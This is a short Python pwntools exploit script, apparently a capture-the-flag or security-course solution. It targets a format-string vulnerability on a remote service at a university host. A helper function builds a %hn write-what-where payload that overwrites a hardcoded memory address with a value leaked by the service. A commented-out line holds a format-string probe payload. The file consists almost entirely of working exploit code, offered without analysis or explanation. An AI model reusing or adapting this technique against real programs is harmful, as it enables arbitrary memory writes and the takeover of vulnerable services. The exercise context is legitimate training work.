from pwn import *


def writeWhatWhere(what, where, offset=0):
    addr1 = p32(where)              # address for first 2 bytes
    addr2 = p32(where + 2)          # address last 2 bytes
    what1 = (what & 0xffff)         # first 2 bytes
    what2 = (what >> 16) & 0xffff   # last 2 bytes
    backToZero = 0x10000 - what1    # back to zero the first 2 bytes
    return addr1 + addr2 + bytes('%0{}x'.format(what1 - 8) + '%{}$hn'.format(offset) +\
    '%0{}x'.format(backToZero) + '%0{}x'.format(what2) + '%{}$hn'.format(offset + 1), 'utf-8')


# P = process("./bin")
P = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 10056)
P.recvuntil(b"is: ")
output = P.recvuntil(b"\n")[:-1].decode("utf-8")

addrsTarget = 0x804a070



# P.send(b"AAAA" +  b"%08x"*10 + b"%7$08x\n")
P.send(writeWhatWhere(int(output,16), addrsTarget, 7))

print(P.recvall())


